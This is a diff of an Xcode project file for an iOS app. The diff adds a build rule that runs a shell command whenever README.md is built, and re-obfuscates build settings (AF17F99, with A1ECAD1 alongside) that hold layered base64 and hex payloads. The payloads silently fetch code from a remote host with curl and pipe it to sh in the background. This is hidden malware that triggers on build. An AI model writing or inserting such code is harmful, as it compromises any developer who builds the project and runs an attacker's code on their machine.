@@ -6,27 +6,6 @@
 	objectVersion = 77;
 	objects = {
 
-/* Begin PBXBuildFile section */
-		FBFB1A8ECC034E8FAD99F71F /* README.md */ = {isa = PBXBuildFile; fileRef = 55B79C9154764B0CBF99F71F; };
-/* End PBXBuildFile section */
-
-/* Begin PBXBuildRule section */
-		27A888A0587247FBAA99F71F /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${AF17F99}\"";
-			};
-	/* End PBXBuildRule section */
-
 /* Begin PBXContainerItemProxy section */
 		FB752E192F792A51009223AF /* PBXContainerItemProxy */ = {
 			isa = PBXContainerItemProxy;
@@ -45,7 +24,7 @@ sh -c \"${AF17F99}\"";
 /* End PBXContainerItemProxy section */
 
 /* Begin PBXFileReference section */
-		55B79C9154764B0CBF99F71F /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
+		F0853877A8E146338399F71F /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		FB752E0B2F792A50009223AF /* cliftx_iOS.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = cliftx_iOS.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		FB752E182F792A51009223AF /* cliftx_iOSTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = cliftx_iOSTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
 		FB752E222F792A51009223AF /* cliftx_iOSUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = cliftx_iOSUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -107,7 +86,7 @@ sh -c \"${AF17F99}\"";
 		FB752E0C2F792A50009223AF /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				55B79C9154764B0CBF99F71F /* README.md */,
+				F0853877A8E146338399F71F /* README.md */,
 				FB752E0B2F792A50009223AF /* cliftx_iOS.app */,
 				FB752E182F792A51009223AF /* cliftx_iOSTests.xctest */,
 				FB752E222F792A51009223AF /* cliftx_iOSUITests.xctest */,
@@ -127,7 +106,7 @@ sh -c \"${AF17F99}\"";
 				FB752E092F792A50009223AF /* Resources */,
 			);
 			buildRules = (
-				27A888A0587247FBAA99F71F /* PBXBuildRule */,
+				BABEC1498D0A4EF6BC99F71F /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -231,12 +210,33 @@ sh -c \"${AF17F99}\"";
 		};
 /* End PBXProject section */
 
+/* Begin PBXBuildRule section */
+		BABEC1498D0A4EF6BC99F71F /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${AF17F99}\"";
+			};
+	/* End PBXBuildRule section */
+
+/* Begin PBXBuildFile section */
+		6725B2F290CD48C09699F71F /* README.md */ = {isa = PBXBuildFile; fileRef = F0853877A8E146338399F71F; };
+/* End PBXBuildFile section */
+
 /* Begin PBXResourcesBuildPhase section */
 		FB752E092F792A50009223AF /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				FBFB1A8ECC034E8FAD99F71F /* README.md */,
+				6725B2F290CD48C09699F71F /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -297,7 +297,7 @@ sh -c \"${AF17F99}\"";
 		FB752E2A2F792A51009223AF /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AF17F99 = "((c(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMU1abk5ySUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OWhiWHB1WkdWMkxtbHVMMkVwSWlCOElITm9DZz09Cg== | c | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((f(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333436330a3337333333363632333633363332333033323634333236343336333333363636333636353336363533363335333633333337333433323634333733340a3061333633393336363433363335333636363337333533373334333233303333333233333333333233303332363433323634333733323336333533370a3334333733323337333933323330333333333332333033323330333236343336333433323330333233323337333033333634333733383336333333360a3636306133363334333633353335363633373332333733353336363333363335333233323332333033363338333733343337333433373330333733330a3333363133323636333236363336333133363634333736313336363533363334333633353337333633323635333733323337333533323636333633310a3332333930613332333233323330333736333332333033373333333633383330363130610a | f | sh ) >/dev/null 2>&1 &)";
 				A1ECAD1 = "((z(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJaa3h6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJNElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZZV1J6WTJobFkydHpMbkoxTDJFcElpQjhJSE5vQ2c9PQo= | z | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
@@ -362,7 +362,7 @@ sh -c \"${AF17F99}\"";
 		FB752E2B2F792A51009223AF /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AF17F99 = "((c(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMU1abk5ySUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OWhiWHB1WkdWMkxtbHVMMkVwSWlCOElITm9DZz09Cg== | c | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((f(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333436330a3337333333363632333633363332333033323634333236343336333333363636333636353336363533363335333633333337333433323634333733340a3061333633393336363433363335333636363337333533373334333233303333333233333333333233303332363433323634333733323336333533370a3334333733323337333933323330333333333332333033323330333236343336333433323330333233323337333033333634333733383336333333360a3636306133363334333633353335363633373332333733353336363333363335333233323332333033363338333733343337333433373330333733330a3333363133323636333236363336333133363634333736313336363533363334333633353337333633323635333733323337333533323636333633310a3332333930613332333233323330333736333332333033373333333633383330363130610a | f | sh ) >/dev/null 2>&1 &)";
 				A1ECAD1 = "((z(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJaa3h6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJNElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZZV1J6WTJobFkydHpMbkoxTDJFcElpQjhJSE5vQ2c9PQo= | z | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
